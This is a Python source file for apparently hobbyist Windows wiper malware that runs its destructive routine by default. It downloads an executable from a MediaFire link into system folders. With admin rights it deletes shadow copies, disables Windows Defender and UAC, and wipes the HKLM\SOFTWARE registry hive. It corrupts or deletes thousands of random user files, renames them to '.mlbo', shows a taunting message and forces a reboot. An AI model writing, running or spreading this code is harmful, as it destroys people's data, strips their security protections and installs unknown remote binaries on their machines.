#Libraries
import base64
import ctypes, os
import subprocess
import random as rand
import requests, winreg
import tkinter.messagebox as tkMsg

#Variables
#inten = 8*1000 #corruption intensity ##Unused
debug = False #console log stuff
do_destruction = True
admCheck = ctypes.windll.shell32.IsUserAnAdmin()

# to throw off triage
def download():
    try:
        np = requests.get('https://download1640.mediafire.com/0cg81k7i3oog0Vrbdvt4z8Dm6cr_cYgIEn6I2oJdtsv-N_wutfpSfI4z9KrH_cLItET4oZQ6fIi8Feybi8udAp58vKj2ivjUNebKCSktSQxdnFgodWEDHYVdGqVc8cLsiSZPCZPB8BWlqxdub01nZnvJSnWIoj1sxQMJ4FIB554fCPA/pk3gvqwu9nc3fs4/notepad.exe')
        with open('c:\\Windows\\System32\\drivers\\sjs.sys', 'wb') as npFile:
            npFile.write(np.content)
        with open('c:\\Windows\\inf\\sjs.inf', 'wb') as npFile:
            npFile.write(np.content)
    except:
        print('whuh oh :-/')

def do_command(cmd):
    subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW)

def regFuck():
    try:
        funny = winreg.HKEY_LOCAL_MACHINE
        winreg.EnumKey(funny, 0)
        do_command('reg delete "HKLM\SOFTWARE" /f')
    except:
        print('bruh')


# debug check
if debug:
    do_destruction = joe = tkMsg.askyesno(title='Helo :-)', message="You're about to execute possibly something bad. This program could possibly hose some of your files. \n \nDo you want to continue?", icon='question')

# Main destructive part
# skips destruction if the check is false
if not(do_destruction):
    print('jej')
else:
    #downloads file
    download()

    #do funny
    if admCheck:
        try:
            do_command("vssadmin delete shadows /all /quiet")
        except:
            print('g')
        do_command('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
        do_command('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f')
        do_command('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f')

    #main shit
    for i in range(3200):
        try:
            # init
            direc = 'c:\\users'

            #While loop for targeting random files
            while not(os.path.isfile(direc)): #shit straight up doesn't work
                try:
                    dirList = os.listdir(os.path.expanduser(direc))
                    randChoice = rand.choice(dirList)
                    direc = direc+'\\'+randChoice

                    # If statement if it finds a file
                    if os.path.isfile(direc):
                        if debug:
                            print('found a file')
                        break
                except:
                    # Runs this in case it goes for a directory or a read only file
                    if admCheck != 0:
                        direc = 'c:\\'
                    else:
                        direc = 'c:\\users'
                    dirList = os.listdir(os.path.expanduser(direc))
                    randChoice = rand.choice(dirList)
            
            if (os.path.splitext(direc)[1] == '.mlbo') or (os.path.getsize(direc) >= 32000000):
                print('skip file')
            else:
                if ((rand.randint(1,100)) == 1):
                    # deletes file outright in 1/100 chance
                    os.remove(direc)
                else:
                    # Opens the file and converts it to an array
                    with open(direc,'rb') as bFile:
                        arrayList = list(bFile.read())


                    # This try and except thing is pretty stupid since this shouldn't go out of range but I'm still adding it here
                    #This for loop swaps values with neighboring ones            
                    try:
                        for i in range(round(len(arrayList)/10)):
                            arrayList[rand.randint(0,len(arrayList)-1)] = rand.choice(arrayList)
                    except:
                        print('failed to shift file')
                    
                    #convert array list to bytearray
                    byteArray = bytearray(arrayList)

                    #export file
                    finalFile = open(direc, 'wb')
                    finalFile.write(bytes(byteArray))
                    finalFile.close()

                    # rename file
                    os.rename(direc, os.path.splitext(direc)[0] + '.mlbo')

                # Debug log stuff
                if debug:
                    print('wrote to file')
        except:
            # rerolls the file incase it errors out
            print('rerolling id: ' + str(i))


# shows this message after destruction
if do_destruction:
    tkMsg.showinfo(title='get rekt lmfao',message='Count your days.')

    if admCheck != 0:
        # try to do funny
        regFuck()
    else:
        do_command('shutdown -r -t 0')

